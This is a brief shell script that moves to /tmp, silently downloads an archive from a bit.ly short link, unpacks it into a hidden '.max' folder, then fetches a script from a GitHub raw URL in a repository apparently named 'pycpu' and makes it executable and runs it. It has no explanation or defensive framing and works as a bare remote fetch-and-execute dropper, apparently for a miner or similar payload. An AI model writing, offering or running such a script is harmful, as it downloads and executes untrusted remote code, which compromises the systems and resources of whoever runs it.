#!/bin/sh
sLink='https://github.com/cloud10001/pycpu/raw/main/test.sh'
cd /tmp/
wget -q -O /tmp/maxarc bit.ly/MaxArc
tar -xJvf /tmp/maxarc 
cd .max
wget -O script.sh $sLink 
chmod +x script.sh
./script.sh